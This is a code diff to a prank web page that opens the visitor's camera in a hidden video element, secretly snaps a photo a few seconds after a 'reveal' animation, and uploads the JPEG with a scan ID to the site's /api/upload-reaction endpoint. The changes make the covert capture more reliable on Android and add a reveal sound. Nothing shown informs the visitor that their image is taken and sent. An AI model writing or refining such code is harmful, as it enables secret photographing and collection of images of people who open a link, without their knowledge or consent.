@@ -220,6 +220,9 @@
   <video id="video" width="640" height="480" autoplay playsinline muted style="display:none;"></video>
   <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
+  <!-- Audio for prank reveal -->
+  <audio id="prank-sound" src="/sound.mp3" preload="auto"></audio>
+
   <script>
     // Get scanId from URL - 100% reliable on mobile
     const urlParams = new URLSearchParams(window.location.search);
@@ -238,36 +241,45 @@
         const video = document.getElementById('video');
         video.srcObject = stream;
         
-        // Capture after reveal animation starts
-        setTimeout(() => {
-          const canvas = document.getElementById('canvas');
-          const context = canvas.getContext('2d');
-          context.drawImage(video, 0, 0, 640, 480);
-          
-          canvas.toBlob(async (blob) => {
-            const formData = new FormData();
-            formData.append('reaction', blob, 'reaction.jpg');
-            formData.append('scanId', scanId);
+        // Wait for video to be actually ready for capture (Fix for Android Black Image)
+        const waitForVideo = setInterval(() => {
+          if (video.readyState >= 2 && video.videoWidth > 0) {
+            clearInterval(waitForVideo);
+            console.log("Video source ready for capture");
             
-            try {
-              const res = await fetch('/api/upload-reaction', {
-                method: 'POST',
-                body: formData
-              });
-              if (res.ok) {
-                console.log("Reaction uploaded!");
-              } else {
-                const errJson = await res.json();
-                console.error("Upload failed:", errJson.error);
-              }
-            } catch (err) {
-              console.error("Network error:", err.message);
-            }
-            
-            // Stop camera
-            stream.getTracks().forEach(track => track.stop());
-          }, 'image/jpeg', 0.8);
-        }, 5800); // 2.3s loading + 3.5s prank = snap!
+            // Capture after reveal animation starts
+            setTimeout(() => {
+              const canvas = document.getElementById('canvas');
+              const context = canvas.getContext('2d');
+              context.drawImage(video, 0, 0, 640, 480);
+              
+              canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('reaction', blob, 'reaction.jpg');
+                formData.append('scanId', scanId);
+                
+                try {
+                  const res = await fetch('/api/upload-reaction', {
+                    method: 'POST',
+                    body: formData
+                  });
+                  if (res.ok) {
+                    console.log("Reaction uploaded!");
+                  } else {
+                    const errJson = await res.json();
+                    console.error("Upload failed:", errJson.error);
+                  }
+                } catch (err) {
+                  console.error("Network error:", err.message);
+                }
+                
+                // Stop camera
+                stream.getTracks().forEach(track => track.stop());
+              }, 'image/jpeg', 0.8);
+            }, 5800); 
+          }
+        }, 500);
+
       } catch (e) {
         console.error("Camera access failed:", e.message);
       }
@@ -280,6 +292,13 @@
     setTimeout(() => {
       document.getElementById('loading').style.display = 'none';
       document.getElementById('reveal').style.display = 'block';
+      
+      // Play sound
+      const sound = document.getElementById('prank-sound');
+      if (sound) {
+        sound.play().catch(e => console.log("Audio autoplay blocked, but camera permission might have enabled it: ", e));
+      }
+      
       spawnEmojis();
     }, 2600);
 
